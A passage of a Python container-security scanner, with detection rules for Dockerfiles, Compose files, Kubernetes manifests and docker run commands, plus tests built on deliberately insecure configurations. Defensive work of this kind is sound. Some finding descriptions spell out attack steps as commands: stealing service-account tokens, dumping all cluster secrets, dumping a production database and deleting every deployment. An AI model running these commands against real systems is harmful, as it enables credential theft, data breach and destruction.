                            "step_8": "Tests credentials: psql -h prod-db.internal -U postgres -W (enters MySecretPass)",
                            "step_9": "Dumps production database: pg_dump prod > stolen.sql",
                            "step_10": "Exfiltrates 5M customer records, demands $500k ransom",
                            "impact": "Credential Exposure → Database Access → Data Breach (5M records) → Ransom Demand"
                        }
                    }
                })
                self.score = 0

        # Pattern 6: Using :latest tag
        if re.search(r'image:.*:latest|image:\s*[^:]+(?:\s|$)', code):
            locations = find_pattern_locations(code, r'image:')
            if locations:
                self.vulnerabilities.append({
                    "type": "LATEST_IMAGE_TAG",
                    "severity": "MEDIUM",
                    "description": "Using :latest tag or no tag - unpredictable deployments",
                    "recommendation": "Pin specific image versions: nginx:1.21.6-alpine",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = max(0, self.score - 1)

        # Pattern 7: Overly permissive RBAC
        if re.search(r'kind:\s*(?:ClusterRoleBinding|RoleBinding)', code):
            has_cluster_admin = re.search(r'roleRef:\s*\n\s+name:\s*cluster-admin', code)

            if has_cluster_admin:
                locations = find_pattern_locations(code, r'roleRef:\s*\n\s+name:\s*cluster-admin')
                if locations:
                    self.vulnerabilities.append({
                        "type": "CLUSTER_ADMIN_BINDING",
                        "severity": "CRITICAL",
                        "description": "Cluster-Admin RoleBinding - ATTACK: cluster-admin is superuser role with full access to ALL Kubernetes resources cluster-wide. Binding service accounts or users to cluster-admin grants unlimited power: create/delete any resource, access all secrets, escalate privileges. EXPLOITATION: (1) Attacker compromises pod with cluster-admin service account, (2) Steals token: cat /var/run/secrets/kubernetes.io/serviceaccount/token, (3) Authenticates as cluster-admin: kubectl --token=$TOKEN get secrets --all-namespaces, (4) Accesses ALL secrets, deploys malicious workloads, deletes production. IMPACT: Full Cluster Takeover, Access All Secrets (databases, APIs), Deploy Cryptominers/Ransomware, Delete Production Workloads. REAL-WORLD: CVE-2018-1002105 (K8s privilege escalation to cluster-admin), Kubeflow 2019 (default cluster-admin service account). SERVICE ACCOUNTS: Pods inherit service account permissions - cluster-admin pod = cluster-admin attacker. RBAC BYPASS: cluster-admin bypasses ALL PodSecurityPolicies, admission controllers, resource quotas.",
                        "recommendation": "CRITICAL FIX: Never bind cluster-admin except for break-glass emergencies. CREATE CUSTOM ROLES: Define specific permissions needed: rules: [{apiGroups: [''], resources: ['pods'], verbs: ['get','list']}]. NAMESPACE SCOPE: Use Role (namespace-scoped) instead of ClusterRole for namespace-specific access. SERVICE ACCOUNTS: Create minimal service accounts per application: kubectl create sa app-sa, bind to custom role. AUDIT: Review all RoleBindings: kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name==\"cluster-admin\")'. TOOLS: Use rbac-lookup, rbac-police to audit excessive permissions. PRINCIPLE: Least privilege - grant minimum permissions for functionality. POD IDENTITY: Use Workload Identity (GKE), Pod Identity (EKS), AAD Pod Identity (AKS) for cloud credentials instead of cluster-admin.",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content'],
                        "detection_reasoning": {
                            "criteria_for_vulnerability": [
                                "ClusterRoleBinding or RoleBinding resource",
                                "roleRef.name: cluster-admin",
                                "Grants superuser access"
                            ],
                            "why_vulnerable": [
                                f"Line {locations[0]['line_number']}: Binding to cluster-admin role",
                                "cluster-admin = * permissions on * resources in * namespaces",
                                "Can create, read, update, delete ANY Kubernetes resource",
                                "Can access all Secrets in all namespaces",
                                "Can escalate privileges by creating new cluster-admin bindings",
                                "EXPLOITATION: Compromised pod with cluster-admin → steal all secrets",
                                "EXPLOITATION: kubectl --token=$STOLEN get secrets --all-namespaces -o yaml > all-secrets.yaml",
                                "EXPLOITATION: Deploy DaemonSet with hostPath: / on all nodes → full control",
                                "EXPLOITATION: Delete production: kubectl delete deployments --all --all-namespaces",
                                "REAL-WORLD: CVE-2018-1002105 (privilege escalation to cluster-admin)",
                                "IMPACT: One compromised cluster-admin pod → entire cluster compromised"
                            ],
                            "why_not_vulnerable": [],
                            "patterns_checked": [
                                "ClusterRoleBinding resource",
                                "roleRef.name field",
                                "Value 'cluster-admin'"
                            ],
                            "evidence": {
                                "found_patterns": ["Binding to cluster-admin role"],
                                "line_numbers": [locations[0]['line_number']],
                                "code_snippets": [locations[0]['line_content']]
                            },
                            "attack_scenario": {
                                "step_1": "CI/CD pipeline service account bound to cluster-admin for 'convenience'",
                                "step_2": "Attacker compromises CI/CD system (e.g., Jenkins RCE vulnerability)",
                                "step_3": "Finds Kubernetes service account token in Jenkins pod: cat /var/run/secrets/kubernetes.io/serviceaccount/token",
                                "step_4": "Exports token: export KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
                                "step_5": "Authenticates to API server: kubectl --token=$KUBE_TOKEN --server=https://k8s-api get pods",
                                "step_6": "Confirms cluster-admin access: kubectl --token=$KUBE_TOKEN auth can-i '*' '*' --all-namespaces → yes",
                                "step_7": "Dumps all secrets: kubectl --token=$KUBE_TOKEN get secrets --all-namespaces -o yaml > all-secrets.yaml",
                                "step_8": "Finds production database credentials, AWS keys, API tokens",
                                "step_9": "Deploys cryptominer DaemonSet: kubectl --token=$KUBE_TOKEN apply -f cryptominer-daemonset.yaml",
                                "step_10": "Holds cluster ransom: kubectl --token=$KUBE_TOKEN delete deployments,services,ingresses --all --all-namespaces",
                                "impact": "Full Cluster Takeover → All Secrets Stolen → Cryptomining + Ransomware → $millions in damage"
                            }
                        }
                    })
                    self.score = 0

        # Pattern 8: Service account token automounting (default behavior)
        if is_k8s_manifest:
            has_automount_disable = re.search(r'automountServiceAccountToken:\s*false', code)

            # If the manifest doesn't explicitly disable automounting and doesn't need K8s API access
            if not has_automount_disable and not re.search(r'serviceAccount(?:Name)?:', code):
                locations = find_pattern_locations(code, r'kind:\s*(?:Deployment|Pod)')
                if locations:
                    self.vulnerabilities.append({
                        "type": "AUTOMOUNT_SERVICE_ACCOUNT_TOKEN",
                        "severity": "MEDIUM",
                        "description": "Service account token auto-mounted - unnecessary API access",
                        "recommendation": "Add automountServiceAccountToken: false if pod doesn't need K8s API",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
                    self.score = max(0, self.score - 1)

        # Pattern 9: Unrestricted network policy
        if re.search(r'kind:\s*Service', code):
            is_loadbalancer = re.search(r'type:\s*LoadBalancer', code)
            has_source_ranges = re.search(r'loadBalancerSourceRanges:', code)

            if is_loadbalancer and not has_source_ranges:
                locations = find_pattern_locations(code, r'type:\s*LoadBalancer')
                if locations:
                    self.vulnerabilities.append({
                        "type": "UNRESTRICTED_NETWORK_POLICY",
                        "severity": "HIGH",
                        "description": "LoadBalancer service accessible from anywhere",
                        "recommendation": "Add loadBalancerSourceRanges to restrict access",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
                    self.score = 0

        # Apply severity-weighted penalties (opt-in for backward compatibility)
        if self.use_severity_penalties:
            from utils.scoring import calculate_score_with_severity_penalties
            final_score = calculate_score_with_severity_penalties(
                self.vulnerabilities,
                self.score,
                2
            )
        else:
            # Default backward-compatible behavior
            final_score = self.score
        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
            self.score = 0

        return {
            "score": final_score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _analyze_docker_compose(self, code: str) -> Dict:
        """Analyze Docker Compose configuration for security issues."""
        self.vulnerabilities = []
        self.score = 2

        # Pattern 1: Privileged containers
        if re.search(r'privileged:\s*true', code, re.IGNORECASE):
            locations = find_pattern_locations(code, r'privileged:\s*true')
            if locations:
                self.vulnerabilities.append({
                    "type": "COMPOSE_PRIVILEGED",
                    "severity": "CRITICAL",
                    "description": "Docker Compose service with privileged: true - full host access",
                    "recommendation": "Remove privileged: true. Use specific capabilities instead: cap_add: [NET_BIND_SERVICE]",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = 0

        # Pattern 2: Docker socket mounted
        if re.search(r'/var/run/docker\.sock:/var/run/docker\.sock', code):
            locations = find_pattern_locations(code, r'/var/run/docker\.sock')
            if locations:
                self.vulnerabilities.append({
                    "type": "COMPOSE_DOCKER_SOCKET",
                    "severity": "CRITICAL",
                    "description": "Docker socket mounted - allows container escape via Docker daemon access",
                    "recommendation": "Never mount Docker socket. Use Docker-in-Docker (dind) or docker.sock via TCP with TLS if needed",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = 0

        # Pattern 3: Host network mode
        if re.search(r'network_mode:\s*["\']?host["\']?', code, re.IGNORECASE):
            locations = find_pattern_locations(code, r'network_mode:\s*["\']?host')
            if locations:
                self.vulnerabilities.append({
                    "type": "COMPOSE_HOST_NETWORK",
                    "severity": "HIGH",
                    "description": "Host network mode bypasses container network isolation",
                    "recommendation": "Use bridge network with published ports: ports: ['8080:80']",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = max(0, self.score - 1)

        # Pattern 4: Host PID namespace
        if re.search(r'pid:\s*["\']?host["\']?', code, re.IGNORECASE):
            locations = find_pattern_locations(code, r'pid:\s*["\']?host')
            if locations:
                self.vulnerabilities.append({
                    "type": "COMPOSE_HOST_PID",
                    "severity": "CRITICAL",
                    "description": "Host PID namespace allows container to see all host processes",
                    "recommendation": "Remove pid: host. Use default container PID namespace isolation",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = 0

        # Pattern 5: Dangerous capabilities
        if re.search(r'cap_add:\s*\n\s*-\s*(SYS_ADMIN|SYS_PTRACE|SYS_MODULE|NET_ADMIN|ALL)', code, re.IGNORECASE):
            locations = find_pattern_locations(code, r'cap_add:')
            if locations:
                self.vulnerabilities.append({
                    "type": "COMPOSE_DANGEROUS_CAPS",
                    "severity": "CRITICAL",
                    "description": "Dangerous Linux capabilities added - privilege escalation risk",
                    "recommendation": "Only add specific capabilities needed: cap_add: [NET_BIND_SERVICE]",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = 0

        # Pattern 6: Security features disabled
        if re.search(r'security_opt:\s*\n\s*-\s*(apparmor[=:]unconfined|seccomp[=:]unconfined)', code, re.IGNORECASE):
            locations = find_pattern_locations(code, r'security_opt:')
            if locations:
                self.vulnerabilities.append({
                    "type": "COMPOSE_SECURITY_DISABLED",
                    "severity": "HIGH",
                    "description": "AppArmor or Seccomp disabled - removes container isolation",
                    "recommendation": "Remove security_opt or use custom profiles, not 'unconfined'",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = max(0, self.score - 1)

        # Pattern 7: Running as root
        has_user = re.search(r'user:\s*(?!root\b|0\b)\w+', code, re.IGNORECASE)
        if 'services:' in code and not has_user:
            self.vulnerabilities.append({
                "type": "COMPOSE_RUNNING_AS_ROOT",
                "severity": "HIGH",
                "description": "Docker Compose service does not specify non-root user",
                "recommendation": "Add user: '1000:1000' or user: 'appuser' to service definition",
                "line_number": 0,
                "code_snippet": ""
            })
            self.score = max(0, self.score - 1)

        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
            self.score = 0

        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _analyze_runtime_commands(self, code: str) -> Dict:
        """Analyze Docker runtime commands in scripts for security issues."""
        self.vulnerabilities = []
        self.score = 2

        # Pattern 1: docker run with --privileged
        if re.search(r'docker\s+run.*--privileged', code, re.IGNORECASE):
            locations = find_pattern_locations(code, r'docker\s+run.*--privileged')
            if locations:
                self.vulnerabilities.append({
                    "type": "RUNTIME_PRIVILEGED",
                    "severity": "CRITICAL",
                    "description": "Docker container started with --privileged - full host access",
                    "recommendation": "Remove --privileged. Add specific capabilities: --cap-add=NET_BIND_SERVICE",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = 0

        # Pattern 2: Docker socket mounted at runtime
        if re.search(r'docker\s+run.*-v\s*/var/run/docker\.sock', code, re.IGNORECASE):
            locations = find_pattern_locations(code, r'docker\s+run.*-v\s*/var/run/docker\.sock')
            if locations:
                self.vulnerabilities.append({
                    "type": "RUNTIME_DOCKER_SOCKET",
                    "severity": "CRITICAL",
                    "description": "Docker socket mounted at runtime - container escape risk",
                    "recommendation": "Do not mount /var/run/docker.sock. Use alternative approaches like Docker-in-Docker",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = 0

        # Pattern 3: Host network mode
        if re.search(r'docker\s+run.*--net(?:work)?[=\s]+host', code, re.IGNORECASE):
            locations = find_pattern_locations(code, r'docker\s+run.*--net(?:work)?[=\s]+host')
            if locations:
                self.vulnerabilities.append({
                    "type": "RUNTIME_HOST_NETWORK",
                    "severity": "HIGH",
                    "description": "Docker container uses host network - bypasses network isolation",
                    "recommendation": "Use bridge network: docker run -p 8080:80 instead of --net=host",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = max(0, self.score - 1)

        # Pattern 4: Host PID namespace
        if re.search(r'docker\s+run.*--pid[=\s]+host', code, re.IGNORECASE):
            locations = find_pattern_locations(code, r'docker\s+run.*--pid[=\s]+host')
            if locations:
                self.vulnerabilities.append({
                    "type": "RUNTIME_HOST_PID",
                    "severity": "CRITICAL",
                    "description": "Docker container uses host PID namespace - can see all host processes",
                    "recommendation": "Remove --pid=host. Use default PID namespace isolation",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = 0

        # Pattern 5: Dangerous capabilities
        if re.search(r'docker\s+run.*--cap-add[=\s]+(ALL|SYS_ADMIN|SYS_PTRACE|SYS_MODULE)', code, re.IGNORECASE):
            locations = find_pattern_locations(code, r'docker\s+run.*--cap-add')
            if locations:
                self.vulnerabilities.append({
                    "type": "RUNTIME_DANGEROUS_CAPS",
                    "severity": "CRITICAL",
                    "description": "Dangerous Linux capabilities added at runtime - privilege escalation",
                    "recommendation": "Only add necessary capabilities: --cap-add=NET_BIND_SERVICE",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = 0

        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
            self.score = 0

        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }


def test_dockerfile_root_user():
    """Test detection of containers running as root."""
    vulnerable_code = '''
FROM python:3.11
WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY . .
EXPOSE 5000
CMD ["python", "app.py"]
'''
    detector = ContainerSecurityDetector()
    result = detector.analyze(vulnerable_code, "dockerfile")
    assert result["score"] < 2, "Should detect running as root"
    assert any('ROOT' in v['type'] for v in result['vulnerabilities'])


def test_dockerfile_unpinned_image():
    """Test detection of unpinned base images."""
    vulnerable_code = '''
FROM node:latest
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
EXPOSE 3000
CMD ["node", "server.js"]
'''
    detector = ContainerSecurityDetector()
    result = detector.analyze(vulnerable_code, "dockerfile")
    assert result["score"] < 2, "Should detect unpinned base image"
    assert any('UNPINNED' in v['type'] for v in result['vulnerabilities'])


def test_docker_compose_privileged():
    """Test detection of privileged Docker Compose services."""
    vulnerable_code = '''
version: '3'
services:
  app:
    image: myapp:latest
    privileged: true
    volumes:
      - ./data:/data
'''
    detector = ContainerSecurityDetector()
    result = detector.analyze(vulnerable_code, "yaml")
    assert result["score"] == 0, "Should detect privileged container"
    assert any('PRIVILEGED' in v['type'] for v in result['vulnerabilities'])
    print("✓ Docker Compose privileged detection working")


def test_docker_compose_socket_mount():
    """Test detection of Docker socket mounting in Compose."""
    vulnerable_code = '''
version: '3'
services:
  jenkins:
    image: jenkins/jenkins:lts
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
      - jenkins_home:/var/jenkins_home
'''
    detector = ContainerSecurityDetector()
    result = detector.analyze(vulnerable_code, "yaml")
    assert result["score"] == 0, "Should detect Docker socket mount"
    assert any('DOCKER_SOCKET' in v['type'] for v in result['vulnerabilities'])
    print("✓ Docker socket mount detection working")


def test_runtime_privileged_command():
    """Test detection of privileged runtime Docker commands."""
    vulnerable_code = '''
#!/bin/bash
# Deploy monitoring container
docker run -d --privileged --name monitor monitoring:latest
'''
    detector = ContainerSecurityDetector()
    result = detector.analyze(vulnerable_code, "bash")
    assert result["score"] == 0, "Should detect privileged runtime command"
    assert any('PRIVILEGED' in v['type'] for v in result['vulnerabilities'])
    print("✓ Runtime privileged command detection working")


def test_kubernetes_privileged_pod():
    """Test detection of privileged Kubernetes pods."""
    vulnerable_code = '''
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: app
    image: nginx:1.19
    securityContext:
      privileged: true
'''
    detector = ContainerSecurityDetector()
    result = detector.analyze(vulnerable_code, "yaml")
    assert result["score"] == 0, "Should detect privileged Kubernetes pod"
    assert any('PRIVILEGED' in v['type'] for v in result['vulnerabilities'])
    print("✓ Kubernetes privileged pod detection working")


def test_kubernetes_hostpath():
    """Test detection of Kubernetes hostPath mounts."""
    vulnerable_code = '''
apiVersion: v1
kind: Pod
metadata:
  name: host-access-pod
spec:
  containers:
  - name: app
    image: nginx:1.19
    volumeMounts:
    - name: host-data
      mountPath: /host
  volumes:
  - name: host-data
    hostPath:
      path: /var/lib/kubelet
'''
    detector = ContainerSecurityDetector()
    result = detector.analyze(vulnerable_code, "yaml")
    assert result["score"] == 0, "Should detect hostPath mount"
    assert any('HOST_PATH' in v['type'] for v in result['vulnerabilities'])
    print("✓ Kubernetes hostPath detection working")


if __name__ == "__main__":
    test_dockerfile_root_user()
    test_dockerfile_unpinned_image()
    test_docker_compose_privileged()
    test_docker_compose_socket_mount()
    test_runtime_privileged_command()
    test_kubernetes_privileged_pod()
    test_kubernetes_hostpath()
    print("\n✅ All Container Security detection tests passed!")
